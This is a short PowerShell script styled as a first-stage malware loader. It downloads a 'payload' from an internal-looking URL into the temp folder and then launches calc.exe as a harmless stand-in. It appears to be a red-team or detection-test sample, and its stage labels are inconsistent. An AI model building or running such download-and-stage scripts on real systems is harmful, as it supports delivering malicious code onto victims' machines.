
[CmdletBinding()]
param(
    [string]$Stage2Url = "https://internal.corp/stage1.ps1",
    [string]$PayloadPath = "$env:TEMP\payload.bin",
    [int]$RequestTimeout = 239
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$FetchResult = Get-Stage1Payload -SourceUrl $Stage2Url -DestinationPath $PayloadPath -TimeoutSec $RequestTimeout
if ($FetchResult) {
    Start-Process -FilePath "calc.exe"
}
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Write-Output "stage 4 initialized"
